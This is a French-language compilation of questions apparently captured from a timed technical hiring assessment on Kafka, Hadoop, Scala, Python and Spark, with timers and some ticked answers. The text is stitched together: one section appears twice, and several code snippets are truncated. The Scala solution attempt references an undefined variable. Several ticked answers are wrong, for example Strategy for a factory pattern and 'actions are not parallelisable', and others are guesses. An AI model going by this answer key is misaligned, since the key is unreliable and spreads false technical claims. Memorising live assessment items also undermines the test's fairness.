- ☐ Lorsqu'un nœud est perdu, ses données sont répliquées dans d'autres nœuds pour conserver un niveau minimum de réplication et ainsi continuer de garantir la fiabilité du système

---

## Question 34/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:14 / 00:30  

**Instructions:**

Combien de NameNodes peut-on avoir dans une architecture Hadoop HA ?

**Réponses:**
- ○ 2
- ○ 1
- ○ 3
- ○ Autant que nécessaire

---

## Question 35/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:18 / 00:40  

**Instructions:**

Dans la liste ci-contre, quels éléments désignent un composant interne de Kafka ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ Producer
- ☐ Namenode
- ☐ Broker
- ☐ Topic
- ☐ Zookeeper

---

## Question 36/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:20 / 00:30  

**Instructions:**

Peut-on avoir, dans la même architecture, un Secondary NameNode et un Passive NameNode ?

**Réponses:**
- ○ Non
- ○ Oui

---

## Question 37/47 - Scala ( Challenge)

**Catégorie:** Scala  
**Temps:** Non spécifié  

**Instructions:**

**Problem:** Portal movement on a 2D grid with portals

Scala  challenge involving:
- Object `Solution extends App`
- Method signature: `def computeFinalPosition(width: Int, height: Int, position: Array[Int], portalsA: Array[Int], portalsB: Array[Int]): Array[Int]`
- Movement directions: 'L' (left), 'R' (right), 'U' (up), 'D' (down)
- Portal teleportation logic checking if current position matches portal coordinates
- Boundary validation to ensure movement stays within grid

**Code visible:**
```scala
import math._
import scala.util._
import scala.io.StdIn._

object Solution extends App {
  
  def computeFinalPosition(width: Int, height: Int, position: Array[Int], portalsA: Array[Int], portalsB: Array[Int]): Array[Int] = {
    // Write your code here
    // To debug: System.err.println("Debug messages...");
    var x = position(0)
    var y = position(1)
    
    for (move <- moves) {
      val (mx, my) = move match {
        case 'L' => (x-1, y)
        case 'R' => (x+1, y)
        case 'U' => (x, y+1)
        case 'D' => (x, y-1)
      }
      
      if (mx >=0 && mx < width && my >=0 && my < height){
        x = mx
        y = my
      }
      
      if (x == portalsA(0) && y == portalsA(1)){
        x = portalsB(0)
        y = portalsB(1)
      } else if (x == portalsB(0) && y == portalsB(1)){
        x = portalsA(0)
        y = portalsA(1)
      }
    }
    
    return Array(x,y)
  }
  
  /* Ignore and do not change the code below */...
}
```

**Tests:**
- Déplacements sans portail
- Déplacements avec portail (cf. exemple)
- Utilisation d'un portail dans les deux sens

---

## Question 38/47 - Hadoop Ecosystem

**Catégorie:** Hadoop Ecosystem  
**Temps:** 00:19 / 01:30  

**Instructions:**

Quels sont les deux éléments XML manquant à la place des **??** dans le fichier de définition du workflow Oozie ci-dessous ?

```xml
<workflow-app name="demo-wf" xmlns="uri:oozie:workflow:1.0">
    <start to="delete-dir"/>
    
    <action name="delete-dir">
        <fs>
            <delete path="/hdfs/path/to/delete"/>
        </fs>
        ??
    </action>
    
</workflow-app>
```

**Consigne:** Écrivez les deux éléments XML séparés par un espace.

**Type de réponse:** Texte libre (input field "Tapez votre réponse")

---

## Question 39/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:28 / 01:30  

**Instructions:**

Nous disposons d'un topic Kafka avec un facteur de réplication de 3 et 10 partitions qui stockent 50 Go de données. Ce topic est consommé par 10 groupes de consommateurs.

La donnée stockée a augmenté à 50 To et le nombre de groupes de consommateurs est maintenant de 100.

Comment les performances du cluster Kafka sont impactées par ces changements ?

**Réponses:**
- ○ Les performances vont baisser en raison de l'augmentation du stockage de données
- ○ Les performances vont s'améliorer grâce à l'augmentation du nombre de groupes de consommateurs
- ○ Les performances vont baisser car Kafka doit envoyer chaque enregistrement (« record ») à un nombre plus grand de consommateurs
- ○ Ces changements n'impactent pas les performances de Kafka, la donnée est distribuée et les consommateurs vont simplement augmenter leur offset

---

## Question 40/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:11 / 00:40  

**Instructions:**

Quelle est la valeur par défaut du "subject name strategy" dans le registre des schémas (Schema registry) ?

**Réponses:**
- ○ DefaultSubjectNameStrategy
- ○ TopicNameStrategy
- ○ RecordNameStrategy
- ○ AvroSerDeNameStrategy
- ○ TopicRecordNameStrategy

---

## Question 41/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:18 / 00:30  

**Instructions:**

Où est-ce que Kafka Connect stocke les offsets validés (committed) de chaque connecteur connecté au cluster ?

**Réponses:**
- ○ Zookeeper
- ○ En mémoire
- ○ FileSystem
- ○ Topic

---

## Question 42/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:20 / 01:00  

**Instructions:**

Dans le code suivant, nous devons envoyer un enregistrement (« record ») à travers Kafka de manière synchrone :

```java
String key = "key";
String value = "value";

ProducerRecord<String,String> record = new ProducerRecord<String, Str
```

Quelle est la façon correcte de faire cela ?

**Réponses:**
- ○ `producer.send(record);`
- ○ `producer.send(record).get();`
- ○ `producer.send(record).wait();`

---

## Question 43/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:09 / 02:00  

**Instructions:**

Une organisation stream actuellement 5 millions d'enregistrements par minute sur un cluster de 25 nœuds. Suite à des efforts de marketing, le nombre d'utilisateurs devrait augmenter de 10 000 à 25 000.

Afin de gérer le flux de données en entrée, combien de nœuds Kafka doivent être ajoutés au cluster ?

**Réponses:**
- ○ 48
- ○ 15
- ○ 15 000
- ○ 25
- ○ 38
- ○ Il est impossible de savoir

---

## Question 44/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:06 / 01:30  

**Instructions:**

Soit l'extrait de code suivant :

```java
StreamsBuilder streamsBuilder = new StreamsBuilder();

// KTable created
// KStreams
// Some Processing

KafkaStreams streams = new KafkaStreams(streamsBuilder.build(), getCo
```

Que se passe-t-il si on exécute `streams.cleanup();` ?

**Réponses:**
- ○ Le stream ne lit que les nouvelles données
- ○ Supprime toutes les données existantes du stream
- ○ Le stream reprend sa lecture des données depuis l'offset
- ○ Supprime les données locales du « metadata store »

---

## Question 45/47 - Kafka

**Catégorie:** Kafka  
**Temps:** 00:04 / 01:00  

**Instructions:**

Pour deux datasets dans un seul topic avec plusieurs partitions, nous souhaitons que l'ordre de distribution des messages se fasse par ordre d'insertion.

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ L'ordre ne peut pas être garanti au niveau des topics avec plusieurs partitions
- ☐ L'ordre ne peut pas être garanti dans Kafka
- ☐ L'ordre est maintenu par Kafka avec le timestamp
- ☐ L'ordre ne peut être maintenu qu'au niveau d'une partition, il est donc nécessaire d'utiliser une donnée commune comme clé

---

## Question 46/47 - Kafka (Security)

**Catégorie:** Kafka  
**Temps:** 00:08 / 01:30  

**Instructions:**

Kafka intègre des fonctionnalités visant à améliorer la sécurité au sein d'un cluster

Parmi les propositions suivantes, quelles sont celles qui sont vraies ?

**Plusieurs réponses attendues.**

**Réponses:**
- ☐ Les producteurs et consommateurs peuvent s'authentifier auprès des brokers
- ☐ Les brokers se connectent à Zookeeper en utilisant une connexion SSL mais sans s'authentifier
- ☐ Les clients Kafka se connectent avec SSL par défaut, mais cette fonctionnalité est désactivable
- ☐ Kafka permet aux clients de se connecter avec SSL, mais cette fonctionnalité est désactivée par défaut
- ☐ L'authentification SASL peut être utilisée en même temps que le chiffrage SSL

---

## Question 47/47 - Kafka (Quotas)

**Catégorie:** Kafka  
**Temps:** 00:12 / 01:30  

**Instructions:**

Des quotas ont été appliqués à l'aide des commandes suivantes :

```bash
kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=1024,consumer_byte_rate=2048' \
  --entity-type clients --entity-name client1

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA \
  --entity-type clients --entity-default

kafka-configs.sh --zookeeper localhost:2181 \
  --alter --add-config 'producer_byte_rate=2048,consumer_byte_rate=4096' \
  --entity-type users --entity-name userA
```

Quel quota est utilisé par le client **(userA, client1)** ?

**Réponses:**
- ○ `producer_byte_rate=1024,consumer_byte_rate=2048`
- ○ `producer_byte_rate=2048,consumer_byte_rate=4096`
- ○ `producer_byte_rate=2048,consumer_byte_rate=1024`
- ○ `producer_byte_rate=1024,consumer_byte_rate=1024`

---

## Résumé par Catégorie

### SQL (5 questions)
1. Question 27/47 - Exécution de commandes shell/fichiers exécutables via SQL
2. Question 28/47 - Identification d'attaque XSS dans table article_commentary
3. Question 29/47 - Atomicité et durabilité des systèmes de base de données (timeout)
4. Question 30/47 - Requête moyenne des étudiants avec avg_score >= 0.9
5. Question 31/47 - Requête clients ayant commandé des cheeseburgers

### Hadoop Ecosystem (5 questions)
1. Question 32/47 - Définition de Heartbeat dans Hadoop
2. Question 33/47 - Gestion de la tolérance aux pannes (choix multiples)
3. Question 34/47 - Nombre de NameNodes en architecture HA
4. Question 36/47 - Secondary NameNode et Passive NameNode dans même architecture
5. Question 38/47 - Oozie workflow XML (éléments manquants)

### Kafka (10 questions)
1. Question 35/47 - Composants internes de Kafka (choix multiples)
2. Question 39/47 - Performance avec augmentation des données et consommateurs
3. Question 40/47 - Schema Registry subject name strategy par défaut
4. Question 41/47 - Stockage des offsets de Kafka Connect
5. Question 42/47 - Envoi synchrone de records avec Producer
6. Question 43/47 - Dimensionnement du cluster (scaling)
7. Question 44/47 - Kafka Streams cleanup() behavior
8. Question 45/47 - Ordre des messages et partitions (choix multiples)
9. Question 46/47 - Sécurité Kafka (SSL, SASL, authentification) (choix multiples)
10. Question 47/47 - Quotas Kafka (configuration)

### Scala (1 question)
1. Question 37/47 -  challenge: Portal movement sur grille 2D

---

## Total Questions: 21 questions (sur 47 de l'évaluation complète)

**Questions capturées:** 27-47 (21 dernières questions)

## Types de Questions:
- Choix Multiple (réponse unique): 12 questions
- Choix Multiple (réponses multiples): 4 questions
- Texte libre: 1 question
-  (Scala): 1 question
- SQL Queries: 3 questions

---

## Notes:
- Évaluation technique en **français**
- Focus sur **Kafka** (10 questions sur 21, soit 48%)
- **SQL** représente 24% des questions (5 questions)
- **Hadoop Ecosystem** représente 24% des questions (5 questions)
- **Scala** représente 5% des questions (1 question de code)
- Temps limites: 30s à 5min par question
- Sujets Kafka couverts:
  - Performance et scalabilité
  - Schema Registry
  - Kafka Connect
  - Kafka Streams
  - Producer/Consumer
  - Sécurité (SSL, SASL)
  - Quotas et configuration
- Sujets SQL couverts:
  - Sécurité (injection SQL, XSS)
  - Exécution de commandes shell
  - Requêtes d'agrégation avec ROUND, GROUP BY
  - Requêtes avec JOIN
  - ACID (atomicité, durabilité)
- Sujets Hadoop couverts:
  - Heartbeat
  - Tolérance aux pannes et réplication
  - Architecture HA (High Availability)
  - NameNode (Secondary, Passive)
  - Oozie workflow XML
- Une question Scala avec logique de déplacement sur grille 2D avec portails
- Questions pratiques avec code Java, Scala et commandes shell
- Niveau: Intermédiaire à Avancé

---

## Détails Techniques Couverts:

**Kafka Core Concepts:**
- Réplication et partitionnement
- Offsets et stockage
- Groupes de consommateurs
- Performance et scaling

**Kafka Streams:**
- StreamsBuilder
- cleanup() method
- State stores

**Kafka Connect:**
- Offset management
- Connector configuration

**Kafka Security:**
- SSL/TLS
- SASL authentication
- Broker-Zookeeper connections

**Kafka Administration:**
- Quota configuration
- kafka-configs.sh commands
- Entity types (users, clients)

**Schema Registry:**
- Subject naming strategies
- Avro serialization

**Hadoop Ecosystem:**
- Oozie workflow definition
- XML configuration



# Évaluation Technique - Questions Extraites

## Question 16/47 - Python 3
**Temps: 00:45 / 12:30**

### Exemple détaillé

Avec ces octets:
```
[3, 44, 55, 66, 8, 110, 220]
```

Le premier octet vaut 3, donc le premier chunk a une **taille de 3**. Ses données sont `[44, 55, 66]`. La somme est 165.

L'octet qui suit vaut 2. Le deuxième bloc a donc une **taille de 2**. Ses données sont `[110, 220]`. La somme est 330. Mais il ne faut conserver que les **8 bits de poids faible**. 330 modulo 256 vaut 74.

Le résultat à renvoyer est une liste contenant les octets `[165, 74]`.

### Implémentation

**Fonction:**
Implémenter la fonction `compute_checksums`

**Paramètres:**
- `file_bytes` (List[int]): une liste d'octets organisée en chunks.

**Valeur de retour:**
- `checksums` (List[int]): Les sommes de contrôles de tous les chunks.

**Contraintes:**
- 1 <= length(file_bytes) <= 1000
- Mémoire RAM disponible: 512 Mo
- Durée maximum d'exécution: 6 secondes

---

## Question 18/47 - Python 3
**Temps: 00:18 / 03:00**

### Instructions

Implémentez la fonction `next_week(d)` qui renvoie une date 7 jours après la date donnée en paramètre.

- `d` est toujours un objet `datetime.date` défini.
- La fonction doit renvoyer un objet `datetime.date`.

---

## Question 21/47 - Scala
**Temps: 00:21 / 00:30**

### Instructions

Dans le code suivant, quelle est l'instruction `case` manquante pour faire un matching par défaut si aucune des valeurs définies (Apple, Banana) n'est matchée?

```scala
def matching(element: String, list: List[String]): Unit = {
  element match {
    case "Apple" => println("It's an apple!")
    case "Banana" => println("It's a banana!")
    // Indiquez le code qu'il faudrait ajouter ici
  }
}
```

**Réponse attendue:** Le pattern par défaut dans un match Scala

---

## Question 22/47 - Scala
**Temps: 00:21 / 00:30**

### Instructions

Qu'affiche ce code?

```scala
var s = "US"
s.toLowerCase()
println(s)
```

**Options de réponse:**
- [ ] us
- [ ] Ce code ne compile pas
- [x] US

---

## Question 23/47 - Scala
**Temps: 00:21 / 00:55**

### Instructions

Qu'est ce qu'on entend par paramètre **implicite**?

**Options de réponse:**
- [ ] Un paramètre dont le type n'est pas spécifié et est déduit à l'exécution
- [ ] Un paramètre pour lequel une valeur par défaut est définie dans la signature
- [x] Un paramètre qui n'est pas passé à l'appel de la méthode correspondante et qui est déduit par le compilateur
- [ ] Un paramètre accessible par toutes les classes du package

---

## Question 24/47 - Scala
**Temps: 00:23 / 01:00**

### Instructions

Le code suivant permet de rajouter un élément à une liste de type `List`. En plus d'être un mauvaise pratique, ce code pourrait causer des problèmes de performance.

```scala
def deleteFromList(element: String, list: List[String]): Unit = {
  var tmpList: List[String] = list ++ element
}
```

Par quoi remplaceriez-vous `List`?

**Options de réponse:**
- [ ] Array
- [x] ListBuffer
- [ ] Vector
- [ ] Seq

---

## Question 25/47 - Scala
**Temps: 00:19 / 00:55**

### Instructions

Compléter le schéma suivant avec le bon mot clé:

```
        Any
       /   \
   AnyVal   AnyRef
              |
           ________
```

**Réponse:** Le type manquant qui hérite de `AnyRef` (probablement `Null` ou une classe personnalisée)

---

## Question 26/47 - Scala
**Temps: 01:04 / 20:00**

### Objectif

Votre avatar de jeu évolue dans un monde étrange comportant **deux portails interspatiaux et bidirectionnels**. Écrivez un programme retournant les coordonnées de votre avatar compte tenu d'une série de déplacements et de l'emplacement des portails.

### Exemple Visuel

```
     0   1   2   3   4
   +---+---+---+---+---+
 0 | 🧑 |   |   |   |   |
   +---+---+---+---+---+
 1 |   | 🎯 |   |   |   |
   +---+---+---+---+---+
 2 |   |   |   |   |   |
   +---+---+---+---+---+
 3 |   |   | 🔵 | 🦆 |   |
   +---+---+---+---+---+
```

**Inputs:**
- width: 5
- height: 4
- position: (0, 0)
- portalA: (1, 1)
- portalB: (2, 3)
- moves: DRR

**Output:** (3, 3)

### Fonctionnement

- Le terrain est représenté par une grille de `width` cases de large et de `height` cases de haut.
- La case en haut à gauche est située à `(0, 0)` où le premier entier représente la colonne et le second la ligne.
- Les positions initiales de votre avatar et des deux portails sont données par des tableaux de deux entiers `position`, `portalA` et `portalB`.
- La série de déplacement, `moves`, est une chaîne composée des caractères `U` (haut), `D` (bas), `R` (droite), `L` (gauche).

Si votre avatar marche vers une case comportant un portail, il se téléporte au portail associé (et il reste sur cette case cible tant qu'il n'effectue pas d'autre déplacement). S'il bute contre une extrémité du terrain, il n'avance pas et ne se téléporte pas.

### Implémentation

Implémentez la méthode `computeFinalPosition(width, height, position, portalA, portalB, moves)` qui:

- prend en entrées les entiers `width`, `height`, les tableaux d'entiers `position`, `portalA`, `portalB`, et la chaîne de caractères `moves` avec:
  - 0 < width < 20
  - 0 < height < 20
  - 0 <= nombre de caractères de moves <= 255

- et retourne la position finale de votre avatar sous la forme d'un **tableau de deux entiers**.

---

## Notes

- Toutes les questions proviennent d'une évaluation technique sur la plateforme ame
- Les questions couvrent Python 3 et Scala
- Le temps indiqué représente le temps passé / temps total alloué
- Certaines questions sont des QCM, d'autres nécessitent une implémentation de code



# Évaluation Technique - Questions Extraites

## Question 16/47 - Python 3
**Temps: 00:45 / 12:30**

### Exemple détaillé

Avec ces octets:
```
[3, 44, 55, 66, 8, 110, 220]
```

Le premier octet vaut 3, donc le premier chunk a une **taille de 3**. Ses données sont `[44, 55, 66]`. La somme est 165.

L'octet qui suit vaut 2. Le deuxième bloc a donc une **taille de 2**. Ses données sont `[110, 220]`. La somme est 330. Mais il ne faut conserver que les **8 bits de poids faible**. 330 modulo 256 vaut 74.

Le résultat à renvoyer est une liste contenant les octets `[165, 74]`.

### Implémentation

**Fonction:**
Implémenter la fonction `compute_checksums`

**Paramètres:**
- `file_bytes` (List[int]): une liste d'octets organisée en chunks.

**Valeur de retour:**
- `checksums` (List[int]): Les sommes de contrôles de tous les chunks.

**Contraintes:**
- 1 <= length(file_bytes) <= 1000
- Mémoire RAM disponible: 512 Mo
- Durée maximum d'exécution: 6 secondes

---

## Question 18/47 - Python 3
**Temps: 00:18 / 03:00**

### Instructions

Implémentez la fonction `next_week(d)` qui renvoie une date 7 jours après la date donnée en paramètre.

- `d` est toujours un objet `datetime.date` défini.
- La fonction doit renvoyer un objet `datetime.date`.

---

## Question 21/47 - Scala
**Temps: 00:21 / 00:30**

### Instructions

Dans le code suivant, quelle est l'instruction `case` manquante pour faire un matching par défaut si aucune des valeurs définies (Apple, Banana) n'est matchée?

```scala
def matching(element: String, list: List[String]): Unit = {
  element match {
    case "Apple" => println("It's an apple!")
    case "Banana" => println("It's a banana!")
    // Indiquez le code qu'il faudrait ajouter ici
  }
}
```

**Réponse attendue:** Le pattern par défaut dans un match Scala

---

## Question 22/47 - Scala
**Temps: 00:21 / 00:30**

### Instructions

Qu'affiche ce code?

```scala
var s = "US"
s.toLowerCase()
println(s)
```

**Options de réponse:**
- [ ] us
- [ ] Ce code ne compile pas
- [x] US

---

## Question 23/47 - Scala
**Temps: 00:21 / 00:55**

### Instructions

Qu'est ce qu'on entend par paramètre **implicite**?

**Options de réponse:**
- [ ] Un paramètre dont le type n'est pas spécifié et est déduit à l'exécution
- [ ] Un paramètre pour lequel une valeur par défaut est définie dans la signature
- [x] Un paramètre qui n'est pas passé à l'appel de la méthode correspondante et qui est déduit par le compilateur
- [ ] Un paramètre accessible par toutes les classes du package

---

## Question 24/47 - Scala
**Temps: 00:23 / 01:00**

### Instructions

Le code suivant permet de rajouter un élément à une liste de type `List`. En plus d'être un mauvaise pratique, ce code pourrait causer des problèmes de performance.

```scala
def deleteFromList(element: String, list: List[String]): Unit = {
  var tmpList: List[String] = list ++ element
}
```

Par quoi remplaceriez-vous `List`?

**Options de réponse:**
- [ ] Array
- [x] ListBuffer
- [ ] Vector
- [ ] Seq

---

## Question 25/47 - Scala
**Temps: 00:19 / 00:55**

### Instructions

Compléter le schéma suivant avec le bon mot clé:

```
        Any
       /   \
   AnyVal   AnyRef
              |
           ________
```

**Réponse:** Le type manquant qui hérite de `AnyRef` (probablement `Null` ou une classe personnalisée)

---

## Question 26/47 - Scala
**Temps: 01:04 / 20:00**

### Objectif

Votre avatar de jeu évolue dans un monde étrange comportant **deux portails interspatiaux et bidirectionnels**. Écrivez un programme retournant les coordonnées de votre avatar compte tenu d'une série de déplacements et de l'emplacement des portails.

### Exemple Visuel

```
     0   1   2   3   4
   +---+---+---+---+---+
 0 | 🧑 |   |   |   |   |
   +---+---+---+---+---+
 1 |   | 🎯 |   |   |   |
   +---+---+---+---+---+
 2 |   |   |   |   |   |
   +---+---+---+---+---+
 3 |   |   | 🔵 | 🦆 |   |
   +---+---+---+---+---+
```

**Inputs:**
- width: 5
- height: 4
- position: (0, 0)
- portalA: (1, 1)
- portalB: (2, 3)
- moves: DRR

**Output:** (3, 3)

### Fonctionnement

- Le terrain est représenté par une grille de `width` cases de large et de `height` cases de haut.
- La case en haut à gauche est située à `(0, 0)` où le premier entier représente la colonne et le second la ligne.
- Les positions initiales de votre avatar et des deux portails sont données par des tableaux de deux entiers `position`, `portalA` et `portalB`.
- La série de déplacement, `moves`, est une chaîne composée des caractères `U` (haut), `D` (bas), `R` (droite), `L` (gauche).

Si votre avatar marche vers une case comportant un portail, il se téléporte au portail associé (et il reste sur cette case cible tant qu'il n'effectue pas d'autre déplacement). S'il bute contre une extrémité du terrain, il n'avance pas et ne se téléporte pas.

### Implémentation

Implémentez la méthode `computeFinalPosition(width, height, position, portalA, portalB, moves)` qui:

- prend en entrées les entiers `width`, `height`, les tableaux d'entiers `position`, `portalA`, `portalB`, et la chaîne de caractères `moves` avec:
  - 0 < width < 20
  - 0 < height < 20
  - 0 <= nombre de caractères de moves <= 255

- et retourne la position finale de votre avatar sous la forme d'un **tableau de deux entiers**.

---

---

## Question 16/47 - Python 3 (Suite)
**Temps: 00:24 / 12:30**

### Objectif Complet

Certains formats de fichiers (images, vidéos, ...) sont **organisés en 'chunks'** (un morceau où fichier contenant l'en-tête et des données). Pour s'assurer que les fichiers ne sont pas corrompus, des sommes de contrôle sont parfois calculées.

Vous recevez en entrée une liste d'entiers compris entre 0 et 255 (paramètre `file_bytes`), représentant les octets d'un fichier. Vous devez renvoyer les **sommes de contrôle de tous les chunks**.

Le fichier est structuré comme suit:
- Le premier octet est l'en-tête du premier chunk, il définit **sa taille** (l'en-tête n'est pas compté dans la taille).
- Les octets suivants sont les données du chunk.
- L'octet suivant est l'en-tête du deuxième chunk, et ainsi de suite.

Les données que vous obtenez en entrée seront toujours cohérentes. Par exemple, si l'en-tête du dernier chunk est 5, vous avez exactement 5 octets juste après, ni plus.

**Notes importantes:**
- Vous devez récupérer tous les entiers d'un chunk, et gardez uniquement les **8 bits de poids faible** pour avoir sa somme de contrôle. Puis renvoyez une liste contenant toutes les sommes de contrôle.
- **Attention:** certains chunks peuvent avoir une taille de 0. Dans ce cas, il n'y a pas d'octets de données. L'octet suivant est l'en-tête du chunk suivant.
- Un chunk de taille 0 a une somme de contrôle de 0.
- La liste donné en entrée contient toujours au moins un chunk.

---

## Question 14/47 - Python 3
**Temps: 00:39 / 00:45**

### Instructions

Parmi les propositions suivantes, lesquelles permettent de transformer une liste de chaînes:

```python
strs = ['0', '1', '2']
```

en une liste d'entiers:

```python
[0, 1, 2]
```

**Cochez toutes les propositions valides.**

**Options de réponse:**
- [ ] `[list(map(int, strs))]`
- [x] `[int(x) for x in strs]`
- [ ] `strs.map(lambda x: int(x))`
- [ ] Aucune des propositions ci-dessus

---

## Question 13/47 - Python 3
**Temps: 00:27 / 02:35**

### Instructions

Lequel de ces patrons de conception (design pattern) est utilisé ici? Une seule proposition attendue.

```python
class ExposedClass:
    class NestedClassA():
        def do():
            return 'Doing A'
    
    class NestedClassB():
        def do():
            return 'Doing B'
    
    def create(type:):
        if type == 'A':
            return NestedClassA()
        if type == 'B':
            return NestedClassB()
        raise Exception('invalid type: ' + type)

a_instance = ExposedClass.create('A')
print(a_instance.do())
```

**Options de réponse:**
- [ ] Adapter
- [ ] Decorator
- [ ] Singleton
- [ ] Observer
- [ ] Visitor
- [ ] Factory
- [x] Strategy

---

## Question 11/47 - Apache Spark
**Temps: 00:26 / 01:00**

### Instructions

Pourquoi, dans certains contextes, les **case class** sont-elles préférables?

```scala
case class MyCaseClass(param1: Seq[String], param2: Int)
class MyClass(param1: Seq[String], param2: Int)
```

**Options de réponse:**
- [ ] Les Case Class sont par défaut serializable et peuvent être distribuées
- [ ] Les Case Class ont des méthodes optimisées pour Spark
- [x] Parce que les Case Class ont une méthode "apply" implicite
- [ ] Parce que les Case Class n'ont pas besoin d'être instanciées

---

## Question 10/47 - Apache Spark
**Temps: 00:10 / 01:20**

### Instructions

Qu'est ce qui est vrai concernant le **Java Serializer** et le **Kryo Serializer**?

Plusieurs réponses attendues.

**Options de réponse:**
- [ ] Toutes les classes Serializable sont gérées par Kryo
- [ ] Des librairies spécifiques sont nécessaires pour gérer les types Serializable qui manquent dans Kryo
- [ ] Java Serializer supporte toutes les classes Serializable, contrairement à Kryo
- [ ] Kryo est plus rapide que le Java Serializer

---

## Question 9/47 - Apache Spark
**Temps: 00:09 / 01:00**

### Instructions

Qu'est ce qui est vrai à propos des **RDDs** et des **Arrays**?

Plusieurs réponses attendues.

**Options de réponse:**
- [ ] Les Arrays, comme les RDDs, sont tolérants aux pannes
- [ ] Les Arrays sont accessibles plus rapidement que les RDDs
- [ ] Les Arrays ne sont pas parallélisables, les RDDs le sont
- [x] Les RDDs fonctionnent comme les Arrays, mais ont accès à plus de méthodes pour distribution

---

## Question 8/47 - Apache Spark
**Temps: 00:10 / 01:20**

### Instructions

En quoi est-elle différente du **ReduceByKey**?

Plusieurs réponses attendues

**Diagramme ReduceByKey:**
```
        Stage 1                Stage 2
┌─────────────────┐      ┌─────────────────┐
│ (a, 1)          │      │ (a, 1)          │
│ (b, 1)  →(a, 1) │      │ (a, 1)  →(a, 2) │
│        →(b, 1)  │  →   │ (a, 1)          │
│                 │      │ (b, 1)  →(a, 3) │
├─────────────────┤      ├─────────────────┤
│ (a, 1)          │      │ (b, 1)          │
│ (a, 1)  →(a, 2) │  →   │ (b, 2)  →(b, 6) │
│ (b, 1)  →(b, 1) │      │ (b, 3)          │
└─────────────────┘      └─────────────────┘
```

**Options de réponse:**
- [ ] Grâce au ReduceByKey, il y a beaucoup moins d'échanges sur le réseau
- [ ] GroupByKey est obsolète depuis Spark 2.2
- [ ] GroupByKey est utilisée exclusivement pour les données structurées
- [ ] GroupByKey ne gère pas le reducing localement dans les noeuds

---

## Question 7/47 - Apache Spark
**Temps: 00:16 / 00:45**

### Instructions

Qu'est ce qui est vrai concernant les **actions** et les **transformations**?

Plus d'une réponse attendue

**Options de réponse:**
- [x] Les actions ne sont pas parallélisables
- [ ] Une transformation est interprétée aussitôt qu'elle est exécutée
- [ ] Les transformations sont Lazy
- [ ] Les transformations ne sont exécutées que lorsqu'une action est appelée

---

## Question 6/47 - Apache Spark
**Temps: 00:15 / 01:00**

### Instructions

Quelle méthode doit être utilisée à la place des **???** ci-dessous?

```scala
var rdd = sc.textFile(path = "/path/to/file")
rdd.???(line => line.contains("filtered_word").foreach(println))
```

**Réponse attendue:** Le nom de la méthode manquante (probablement `filter`)

---

## Question 5/47 - Apache Spark
**Temps: 00:20 / 00:40**

### Instructions

Quelle méthode utilise-t-on pour obtenir un **RDD** à partir d'un Array?

Écrivez le nom de la méthode.

**Réponse attendue:** Le nom de la méthode (probablement `parallelize`)

---

## Question 4/47 - Apache Spark
**Temps: 00:25 / 00:50**

### Instructions

Qu'est ce qu'on entend par **worker node**?

**Options de réponse:**
- [x] Tout noeud pouvant exécuter un bout de code d'un job Spark
- [ ] Un noeud qui stocke les données intermédiaires
- [ ] Un noeud où les données sont stockées pour qu'elles soient visibles par l'utilisateur
- [ ] Un noeud où toute l'application Spark est exécutée

---

## Notes

- Toutes les questions proviennent d'une évaluation technique sur la plateforme ame
- Les questions couvrent Python 3, Scala et Apache Spark
- Le temps indiqué représente le temps passé / temps total alloué
- Certaines questions sont des QCM, d'autres nécessitent une implémentation de code
- Les diagrammes ReduceByKey ont été simplifiés en ASCII art pour la lisibilité